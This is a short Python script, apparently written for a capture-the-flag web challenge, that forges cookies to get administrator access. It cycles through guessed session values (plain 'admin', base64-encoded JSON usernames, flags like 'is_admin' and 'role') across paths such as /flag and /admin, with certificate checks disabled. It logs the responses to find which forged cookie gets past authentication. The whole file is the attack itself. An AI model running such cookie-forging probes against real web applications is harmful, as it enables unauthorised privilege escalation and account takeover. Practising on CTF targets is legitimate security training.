import requests
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
cookiesets=[
 {"session":"admin"},
 {"session":'{"username":"admin"}'},
 {"session":"eyJ1c2VybmFtZSI6ImFkbWluIn0"},
 {"session":"eyJ1c2VybmFtZSI6ImFkbWluIn0="},
 {"session":"eyJhZG1pbiI6dHJ1ZX0"},
 {"user":"admin"},
 {"user":"granny"},
 {"auth":"admin"},
 {"is_admin":"true"},
 {"admin":"true"},
 {"role":"admin"},
 {"username":"admin"},
 {"logged_in":"true"},
 {"session":"{username:admin}"},
 {"SESSION":"eyJ1c2VybmFtZSI6ImFkbWluIn0"},
]
paths=["/","/login","/flag","/dashboard","/admin"]
for cs in cookiesets:
    line=[]
    for p in paths:
        try:
            r=requests.get(URL+p, cookies=cs, timeout=10, verify=False)
            line.append(f"{p}:{r.status_code}:{len(r.content)}")
        except Exception as e:
            line.append(f"{p}:ERR")
    print(cs, "|", " ".join(line))
print("DONE")
